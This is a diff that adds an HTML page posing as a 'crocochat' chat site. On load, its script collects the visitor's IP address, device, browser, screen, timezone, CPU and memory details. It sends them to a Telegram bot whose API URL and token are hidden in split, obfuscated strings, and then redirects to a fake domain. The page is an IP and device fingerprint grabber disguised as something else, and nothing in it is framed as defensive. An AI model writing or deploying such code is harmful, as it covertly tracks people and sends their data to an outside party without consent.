@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>ws chat</title>
+
+<!-- Open Graph Meta Tags -->
+<meta property="og:title" content="crocochat">
+<meta property="og:description" content="that's vuln by cro i said that but it's your business">
+<meta property="og:image" content="https://i.ibb.co/BKrYZd3T/579c364507ebd082a640fe778f4d8726.jpg">
+<meta property="og:type" content="website">
+
+</head>
+<body style="text-align:center;font-family:Arial;background-color: black;">
+<h1>now croco have seen your ip address</h1>
+</body>
+
+<script>
+const aseklmfseknf = "ram.org"
+const FF_MM = "AAEf4uNYyor-";
+const CHAT_ID = "cspsoefjdhsufhseuhfsjnbncvsemfkmkdsmfeu|rsnfjsnejbfsdhbfnbcxvbsBNFSUHEDBFBS.S;.F_ASKMNFIE+dFLSJERFIHDSmslmvd";
+const FMIJLKKKIJHHUOJMN = "XEjCvdAs"
+const bdjfbbseuuhfery = "15330583:"
+const djsfhusrhhfusd = "https://"
+const sdkfmnsrsdhufhsuer = "eleg"
+
+function isMobile() {
+    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+}
+
+// جلب IP
+fetch("https://api.ipify.org?format=json")
+.then(res => res.json())
+.then(ipData => {
+
+    const userIP = ipData.ip;
+    const userAgent = navigator.userAgent;
+    const language = navigator.language;
+    const screenSize = `${screen.width}x${screen.height}`;
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const connection = navigator.connection ? navigator.connection.effectiveType : "unknown";
+    const deviceType = isMobile() ? "Mobile" : "Desktop";
+    const cpuCores = navigator.hardwareConcurrency || "unknown";
+    const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "unknown";
+    const pageURL = window.location.href;
+
+    const message = `
+🚨 New Visitor
+
+🌍 IP: ${userIP}
+📱 Device Type: ${deviceType}
+🖥 User-Agent: ${userAgent}
+🌐 Language: ${language}
+🖥 Screen: ${screenSize}
+⏰ Timezone: ${timezone}
+📶 Connection: ${connection}
+🧠 CPU Cores: ${cpuCores}
+💾 RAM: ${ram}
+🔗 Page: ${pageURL}
+⏰ Time: ${new Date().toLocaleString()}
+`;
+const bash = "/"
+    // إرسال لتليجرام
+    fetch(`${djsfhusrhhfusd}api.t${sdkfmnsrsdhufhsuer}${aseklmfseknf}${bash}bot77${bdjfbbseuuhfery}${FF_MM}6RblPaEwhZfWT5c${FMIJLKKKIJHHUOJMN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: 5731285459,
+            text: message
+        })
+    });
+      setTimeout(() => {
+          window.location.href = "https://googllllllllll.com";
+      }, 1000);
+  });
+</script>
+
+</html>
